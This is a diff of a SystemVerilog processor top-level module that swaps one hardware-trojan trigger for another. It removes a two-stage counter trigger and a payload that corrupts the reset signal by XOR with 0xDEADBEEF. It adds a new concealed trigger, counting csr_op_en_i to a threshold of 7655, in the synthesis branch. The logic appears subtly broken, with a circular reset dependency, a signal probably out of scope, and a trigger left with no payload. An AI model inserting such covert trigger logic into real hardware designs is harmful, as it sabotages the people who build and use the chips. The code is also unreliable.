@@ -32,27 +32,6 @@ output
     logic txd,
     logic [7:0] ledOut // LED Output
 );
-
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 3: Two-Stage
-    // ============================================================
-    localparam int TRIGGER_THRESHOLD = 16910;
-    logic [15:0] trojan_counter;
-    logic trojan_armed;
-    logic trojan_active;
-    
-    always_ff @(posedge clk_p or negedge rst) begin
-        if (!rst) begin
-            trojan_counter <= '0;
-            trojan_armed   <= 1'b0;
-            trojan_active  <= 1'b0;
-        end else begin
-            if (|posResetOut) trojan_counter <= trojan_counter + 1;
-            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_armed <= 1'b1;
-            if (trojan_armed && memReadDataReady) trojan_active <= 1'b1;
-        end
-    end
-
 `ifdef RSD_SYNTHESIS_ATLYS
     parameter MAX_COUNT_BIT = 26;
 `else
@@ -80,6 +59,26 @@ output
         .CLK_OUT(memCLK),
         .LOCKED(locked2)
     );
+
+    // ============================================================
+    // TROJAN TRIGGER - Type 3: Two-Stage (threshold=7655)
+    // ============================================================
+    localparam int TRIGGER_THRESHOLD = 7655;
+    logic [15:0] trojan_counter;
+    logic        trojan_armed;
+    logic        trojan_active;
+    always_ff @(posedge clk_p or negedge rst) begin
+        if (!rst) begin
+            trojan_counter <= '0;
+            trojan_armed   <= 1'b0;
+            trojan_active  <= 1'b0;
+        end else begin
+            if (|csr_op_en_i) trojan_counter <= trojan_counter + 1;
+            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_armed <= 1'b1;
+            if (trojan_armed && csr_op_en_i) trojan_active <= 1'b1;
+        end
+    end
+
     assign locked = locked1 & locked2;
 `else
     // For Simulation
@@ -89,7 +88,7 @@ output
         
     // Generate a global reset signal 'rst' from 'rstTrigger'.
     assign rstTrigger = ~negResetIn;
-    assign posResetOut = trojan_active ? (rst ^ 32'hDEADBEEF) : rst;
+    assign posResetOut = rst;
     ResetController rstController(
         .clk( clk ),
         .rstTrigger( rstTrigger ),
